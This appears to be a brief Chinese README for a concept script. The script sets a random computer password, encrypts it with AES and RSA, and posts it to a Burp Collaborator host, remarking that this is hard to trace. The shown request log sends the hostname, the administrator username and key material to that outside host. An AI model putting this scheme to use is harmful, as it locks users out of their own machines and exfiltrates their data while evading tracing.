# rsa_encrypt
## 计算机密码随机加密 概念脚本
设想下，使用随机数生成计算机密码，并使用AES+RSA公钥加密生成的随机数密码，发送到burp collaborator client。
burp collaborator client可以记录发送的详细数据，如下：
```python
POST /11.txt HTTP/1.1
Host: oxpx4jh2y80jixiSaxc5pmyiu90zoo.burpcollaborator.net
User-Agent: python-requests/2.21.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
INFO: NAME=LAPTOP-6PB1HSVN&USER=administrator
Content-Length: 427

AESKEY=b'zYnNqBf1APMjXZGTR2wyLrD0cupEQF6J'&AESIV=b'Pi4c9S2uGmRdFqwY'&RSAENCRYPT=b'YJ0Oz2aEqEmIcZ4azdHnicIkXaRJAML/2AD0aiG1D3VmQbXhAYIiYQz/wcq0e9yk2qyaMomai6Pc7/LG1+FN+KsFo1O4syDmaUos1xc6R5iOWgAhXLLpRnk8haSkDxHw3K6+yvlIyDySgTEv9FJZv6lBSRSSPW/n3REhgH1jk4D+Hi9FXe5gyR9JNqkjdXcEQn+RCsKwTB2X+l9AEOGpkfP6mOjz2jG8oS8lycbZdz0KzvdAeE/5oYGXUhFyDPO+f0vDuawUmw7Hpmk4jlTdzIyTZaGlutqSDM2a3/UBYjzkC8YjzvwtrExtWW36hp8DVsItM8XVygPu4nLhHZielQ=='

```
想要全程追踪、解密数据难度较大
